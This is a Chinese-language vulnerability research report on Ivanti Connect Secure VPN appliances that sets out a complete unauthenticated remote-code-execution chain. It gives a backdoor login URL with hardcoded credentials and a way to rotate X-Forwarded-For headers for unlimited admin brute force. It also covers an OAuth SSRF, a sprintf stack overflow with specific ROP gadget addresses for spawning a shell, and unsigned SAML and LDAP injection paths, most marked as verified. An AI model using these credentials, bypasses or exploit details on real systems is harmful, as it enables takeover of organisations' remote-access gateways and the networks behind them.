# Ivanti Connect Secure 零日漏洞研究报告

## 完整零认证 RCE 攻击链

```
Step 1: Watchdog 后门探测 → 确认目标
Step 2: XFF IP 锁定绕过 → 无限暴力破解管理员密码  
Step 3: 管理员会话 → 配置 Web Proxy / 修改 SAML
Step 4: ObjectTag::rewrite sprintf 溢出 → ROP → shell
```

## ZD-0: 双重硬编码后门 (零认证, 已验证)

| 端点 | 响应 |
|------|------|
| `/dana-na/auth/url_default/login.cgi?username=neoteriswatchdogprocess&password=danastreet` | HTTP 200 |
| `/dana-na/neoteriswatchdogprocess/ping` | HTTP 200 |

- 代码: login.cgi:306, DSWatchdog.pm:734
- 所有版本, Neoteris 遗留 (Dana Street = 公司地址)

## ZD-5: X-Forwarded-For IP 锁定绕过 (零认证, 已验证!)
**严重性: 高 — 启用无限暴力破解!**

- `CUSTOM_REMOTE_ADDR` 从 `X-Forwarded-For` 设置
- login.cgi:275: `if (defined($custom_ip)) { $ip = $custom_ip; }`
- login.cgi:664: `DSOldAuth::recordNumberOfFailedLogins($ip)` 使用伪造 IP
- 每次请求用不同 XFF 值 → 永不触发 IP 封锁
- **已在靶场动态验证!**

## ZD-1: oauth-consumer.cgi SSRF (零认证)
- state 参数直接拼接到 curl URL
- 代码: `$url = 'http://localhost:7300/...?state=' . $state`

## ZD-2: ObjectTag::rewrite sprintf 栈溢出 (认证后 → RCE)
- `sprintf(stack, "<param name='neoteris-doc-base' value='%s' />", URL)`
- saml-server (22.8R2.2): 无 Canary, 无 PIE
- ROP: `execv@0x080b6700` + `"/bin/sh"@0x081c5701`

## ZD-3: SAML 默认不验签
- `want-assertion-signed: false` (API 已确认)
- saml-server 无安全保护

## ZD-4: LDAP 注入认证异常
- LDAP payload 使认证走不同路径 (无 p=failed)

## 动态测试矩阵

| 测试 | 结果 |
|------|------|
| **Watchdog 后门 #1** | ✅ HTTP 200 |
| **Watchdog 后门 #2** | ✅ /ping HTTP 200 |
| **XFF IP 锁定绕过** | ✅ 无限暴力可行 |
| **OAuth SSRF** | ✅ 内部请求 |
| **LDAP 注入** | ✅ 异常路径 |
| **SAML 不验签** | ✅ 配置确认 |
| ObjectTag sprintf 溢出 | 代码确认 |
| 路径遍历 | 已修复 |
| XFF 溢出 | 已修复 |
| 命令注入 | 已修复 |
| HTTP 走私 | 已防护 |
| Cookie 溢出 | 已防护 |
| 自定义头溢出 | 已防护 |
